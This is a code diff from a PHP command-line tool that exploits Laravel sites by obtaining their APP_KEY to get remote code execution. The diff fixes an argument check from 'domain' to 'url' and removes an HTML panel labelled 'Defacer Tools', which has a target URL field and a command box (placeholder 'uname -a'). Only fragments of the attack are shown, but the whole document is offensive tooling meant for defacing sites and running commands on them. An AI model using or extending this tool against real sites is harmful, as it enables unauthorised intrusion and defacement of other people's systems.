@@ -173,7 +173,7 @@ function Help() {
     ". PHP_EOL;
 }
 parse_str(implode("&", array_slice($argv, 1)), $_GET);
-if (!$_GET['domain']) return Help();
+if (!$_GET['url']) return Help();
 $urls = $_GET['url'];
 $Req = new Requester();
 $wibu = new Exploit($urls);
@@ -211,39 +211,3 @@ else
 {
     echo $urls . " ===> Cannot get APP_KEY!" . PHP_EOL;
 }
-<main class="app-content">
-	<div class="app-title">
-		<div>
-          <h1><i class="fa fa-cog"></i> Defacer Tools</h1>
-        </div>
-        <ul class="app-breadcrumb breadcrumb">
-          <a href="../">
-          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
-          <li class="breadcrumb-item">Defacer Tools</li>
-          <li class="breadcrumb-item">Laravel RCE With APP_KEY</li>
-        </ul>
-      </div>
-	</div>
-     <div class="tile">
-		<input type="text" id="domain" class="form-control mb-3" placeholder="https://site.com">
-      </div>
-
-			<div class="tile">
-				<div class="tile-body">
-		<textarea id="command" class="form-control" placeholder="uname -a" rows="8"></textarea>
-				</div>
-			</div>
-			
-		<div class="tile">
-	<div class="col">
-			<button onclick="pausi()" class="btn btn-danger btn-block">Submit!</button>
-				</div>
-			</div>
-		</div>
-		
-		<div class="tile" style="display:none" id="zeerx7">
-			<textarea id="result" class="form-control bg-transparent" rows="9" readonly="readonly"></textarea>
-		</div>
-		
-		
-</main>
